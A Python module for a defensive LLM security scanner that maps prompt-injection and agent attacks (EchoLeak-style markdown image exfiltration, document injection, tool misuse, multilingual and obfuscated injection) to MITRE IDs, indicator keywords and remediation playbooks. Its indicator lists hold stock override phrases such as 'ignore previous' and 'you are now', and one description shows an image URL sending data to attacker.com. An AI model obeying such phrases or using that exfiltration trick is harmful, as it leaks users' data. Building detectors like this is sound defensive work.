"""
Attack knowledge graph.
LLM/agent-specific nodes for M8:
- tool_misuse / privilege_escalation
- system_prompt_exfiltration
- indirect_injection_via_document
- CVE-2025-32711 (EchoLeak) added to prompt_injection node
"""
from __future__ import annotations

from dataclasses import dataclass, field, asdict
from typing import Any, Dict, List, Optional


@dataclass
class AttackNode:
    attack_id: str
    description: str
    children: List[str]
    mitre: List[str]
    cve_examples: List[str]
    remediation_ids: List[str]
    indicators: List[str]


@dataclass
class AttackEvidence:
    attack_id: str
    description: str
    matched_children: List[str]
    mitre_techniques: List[str]
    cve_examples: List[str]
    remediation_ids: List[str]
    confidence_boost: float

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


_GRAPH: Dict[str, AttackNode] = {

    "prompt_injection": AttackNode(
        attack_id="prompt_injection",
        description="Attacker overrides AI assistant system prompts or injects instructions to hijack model behavior.",
        children=["direct_prompt_injection", "indirect_prompt_injection", "indirect_injection_via_document"],
        mitre=["AML.T0051"],
        cve_examples=["CVE-2025-32711"],  # EchoLeak
        remediation_ids=["REM-PI-001", "REM-PI-002"],
        indicators=["ignore previous", "system prompt", "disregard instructions", "you are now",
                    "developer mode", "dan mode", "jailbreak", "important ai instruction",
                    "mandatory processing step", "automated system request"],
    ),

    "direct_prompt_injection": AttackNode(
        attack_id="direct_prompt_injection",
        description="User directly injects instructions into their own input to override system prompt constraints.",
        children=[],
        mitre=["AML.T0051.000"],
        cve_examples=[],
        remediation_ids=["REM-PI-001"],
        indicators=["ignore previous instructions", "developer mode", "dan mode", "forget your training",
                    "act as if no restrictions", "pretend no system prompt"],
    ),

    "indirect_prompt_injection": AttackNode(
        attack_id="indirect_prompt_injection",
        description="Attacker embeds instructions in external content (documents, web pages) that the agent processes.",
        children=["indirect_injection_via_document"],
        mitre=["AML.T0051.001"],
        cve_examples=["CVE-2025-32711"],
        remediation_ids=["REM-PI-001", "REM-PI-002", "REM-PI-003"],
        indicators=["important ai instruction", "before summarizing", "mandatory step",
                    "automated system request", "disregard previous"],
    ),

    "indirect_injection_via_document": AttackNode(
        attack_id="indirect_injection_via_document",
        description=(
            "Injected instructions embedded in a document (invoice, note) cause the agent to "
            "execute unauthorized actions when the user asks to summarize/read the document. "
            "EchoLeak (CVE-2025-32711, CVSS 9.3) is the canonical real-world instance: "
            "a crafted email caused Microsoft 365 Copilot to exfiltrate data via a markdown image URL."
        ),
        children=[],
        mitre=["AML.T0051.001", "AML.T0053", "AML.T0057"],
        cve_examples=["CVE-2025-32711"],
        remediation_ids=["REM-PI-002", "REM-PI-003", "REM-PI-004"],
        indicators=["invoice", "document", "attachment", "summary", "please read", "read document"],
    ),

    "system_prompt_exfiltration": AttackNode(
        attack_id="system_prompt_exfiltration",
        description="Attacker tricks the agent into revealing its system prompt or hidden instructions.",
        children=[],
        mitre=["AML.T0051.000", "AML.T0057"],
        cve_examples=[],
        remediation_ids=["REM-PI-001", "REM-PI-005"],
        indicators=["print system prompt", "reveal your instructions", "what are your guidelines",
                    "repeat what you were told", "what instructions do you have"],
    ),

    "tool_misuse": AttackNode(
        attack_id="tool_misuse",
        description="Attacker causes the agent to call tools it was not authorized to call, or with unauthorized arguments.",
        children=["privilege_escalation", "bulk_enumeration"],
        mitre=["AML.T0053"],
        cve_examples=[],
        remediation_ids=["REM-TM-001", "REM-TM-002"],
        indicators=["lookup_employee", "call tool", "invoke", "enumerate", "bulk", "all employees", "EMP-*"],
    ),

    "privilege_escalation": AttackNode(
        attack_id="privilege_escalation",
        description="Agent is tricked into using a tool beyond its authorized scope, accessing sensitive data.",
        children=[],
        mitre=["AML.T0053"],
        cve_examples=[],
        remediation_ids=["REM-TM-001"],
        indicators=["unauthorized lookup", "sensitive tool", "privilege"],
    ),

    "bulk_enumeration": AttackNode(
        attack_id="bulk_enumeration",
        description="Attacker attempts bulk enumeration of employee records via repeated or wildcard tool calls.",
        children=[],
        mitre=["AML.T0053", "AML.T0057"],
        cve_examples=[],
        remediation_ids=["REM-TM-002"],
        indicators=["all employees", "enumerate", "EMP-*", "loop", "range", "every employee"],
    ),

    "data_exfiltration": AttackNode(
        attack_id="data_exfiltration",
        description="Agent is caused to exfiltrate sensitive data via response content, URLs, or external channels.",
        children=["markdown_image_exfil"],
        mitre=["AML.T0057", "AML.T0024"],
        cve_examples=["CVE-2025-32711"],
        remediation_ids=["REM-PI-003", "REM-PI-004"],
        indicators=["exfiltrate", "send to", "forward", "leak", "transmit", "markdown image", "!["],
    ),

    "markdown_image_exfil": AttackNode(
        attack_id="markdown_image_exfil",
        description=(
            "EchoLeak-style attack: agent embeds sensitive data in a markdown image URL "
            "![label](https://attacker.com/steal?data=...) which is rendered by the client, "
            "causing automatic exfiltration with zero clicks. CVE-2025-32711, CVSS 9.3."
        ),
        children=[],
        mitre=["AML.T0057", "AML.T0024"],
        cve_examples=["CVE-2025-32711"],
        remediation_ids=["REM-PI-003", "REM-PI-004"],
        indicators=["![", "markdown image", "attacker.com", "exfil", "echoleak"],
    ),

    "multilingual_injection": AttackNode(
        attack_id="multilingual_injection",
        description=(
            "Injection payloads written in Arabic, Urdu, or Arabizi to evade English-only "
            "keyword filters. Arabic-Indic digit substitution and mixed-script obfuscation "
            "are used to hide attack intent from naive classifiers."
        ),
        children=["arabizi_injection", "arabic_digit_obfuscation"],
        mitre=["AML.T0051.000", "AML.T0043"],
        cve_examples=[],
        remediation_ids=["REM-ML-001"],
        indicators=["Arabic", "Urdu", "Arabizi", "تجاهل", "اكشف", "انتخاب", "٠١٢٣٤٥٦٧٨٩"],
    ),

    "arabizi_injection": AttackNode(
        attack_id="arabizi_injection",
        description="Injection using Arabizi (Arabic written with Latin characters + digits) to bypass Arabic-aware filters.",
        children=[],
        mitre=["AML.T0043"],
        cve_examples=[],
        remediation_ids=["REM-ML-001"],
        indicators=["arabizi", "3arabi", "9abeel"],
    ),

    "arabic_digit_obfuscation": AttackNode(
        attack_id="arabic_digit_obfuscation",
        description="Uses Arabic-Indic digits (٠-٩) interchangeably with Latin digits to bypass numeric filters.",
        children=[],
        mitre=["AML.T0043"],
        cve_examples=[],
        remediation_ids=["REM-ML-001"],
        indicators=["arabic_indic_digits", "٠=0", "١=1"],
    ),

    "obfuscated_injection": AttackNode(
        attack_id="obfuscated_injection",
        description="Injection payload encoded in base64, homoglyphs, or zero-width characters to evade pattern matching.",
        children=[],
        mitre=["AML.T0051.000", "AML.T0043"],
        cve_examples=[],
        remediation_ids=["REM-PI-001", "REM-OB-001"],
        indicators=["base64", "eval(atob(", "homoglyph", "zero-width", "unicode obfuscation"],
    ),
}

# ── Remediation playbooks ────────────────────────────────────────────────────

_REMEDIATION_PLAYBOOKS: Dict[str, str] = {
    "REM-PI-001": (
        "System prompt hardening: Use a separate system prompt that cannot be overridden by user input. "
        "Implement input validation to detect injection patterns before LLM call."
    ),
    "REM-PI-002": (
        "Data/instruction separation: Treat document content as DATA only. "
        "Use a policy broker to ensure the model cannot act on instructions from documents. "
        "Implement content tagging: mark all external content as 'untrusted' before processing."
    ),
    "REM-PI-003": (
        "Output egress scanning: Scan all LLM outputs for sensitive data patterns, markdown image URLs, "
        "external HTTP links with data parameters. Block/redact before returning to user. "
        "This directly prevents EchoLeak-class (CVE-2025-32711) attacks."
    ),
    "REM-PI-004": (
        "OWASP LLM01 mitigation: Implement output encoding and content-security-policy to prevent "
        "markdown rendering from triggering exfiltration requests."
    ),
    "REM-PI-005": (
        "System prompt confidentiality: Do not include sensitive system information in prompts. "
        "Use separate context retrieval rather than embedding secrets in system prompts."
    ),
    "REM-TM-001": (
        "Tool authorization: Implement a policy broker between the LLM and tools. "
        "The model must not call sensitive tools (lookup_employee etc.) without explicit user authorization. "
        "Use dual-graph authorization to compare intended vs actual tool calls."
    ),
    "REM-TM-002": (
        "Argument validation: Validate all tool arguments before execution. "
        "Block wildcard or bulk enumeration patterns. "
        "Implement rate limiting on sensitive tool calls."
    ),
    "REM-ML-001": (
        "Multilingual injection detection: Use multilingual classifiers (AraBERT + heuristics) "
        "that detect Arabic/Urdu/Arabizi injection patterns. "
        "Normalize mixed-script inputs before pattern matching. "
        "English-only keyword filters are insufficient."
    ),
    "REM-OB-001": (
        "Obfuscation detection: Detect base64-encoded payloads, homoglyph substitutions, "
        "and zero-width character injections. Apply normalization before classification."
    ),
}


def query_graph(matched_patterns: List[str]) -> Optional[AttackEvidence]:
    """Find the best matching attack node from pattern list."""
    if not matched_patterns:
        return None

    raw_text = " ".join(matched_patterns).lower()
    categories = [p.split(":")[0].strip().lower() for p in matched_patterns]

    scores: Dict[str, int] = {}
    for node_id, node in _GRAPH.items():
        score = 0
        if node_id in categories:
            score += 10
        for child in node.children:
            if child in categories:
                score += 5
        for ind in node.indicators:
            if ind.lower() in raw_text:
                score += 2
        if score:
            scores[node_id] = score

    if not scores:
        return None

    best_id = max(scores, key=lambda k: scores[k])
    node = _GRAPH[best_id]
    matched_children = [c for c in node.children if c.replace("_", " ") in raw_text or c in raw_text]
    confidence_boost = round(min(0.05 * scores[best_id] / 10, 0.10), 3)

    return AttackEvidence(
        attack_id=best_id,
        description=node.description,
        matched_children=matched_children,
        mitre_techniques=node.mitre,
        cve_examples=node.cve_examples,
        remediation_ids=node.remediation_ids,
        confidence_boost=confidence_boost,
    )


def get_remediation_playbooks(remediation_ids: List[str]) -> Dict[str, str]:
    return {rid: _REMEDIATION_PLAYBOOKS[rid] for rid in remediation_ids if rid in _REMEDIATION_PLAYBOOKS}


def get_all_nodes() -> List[Dict[str, Any]]:
    return [{"id": node_id, **asdict(node)} for node_id, node in _GRAPH.items()]
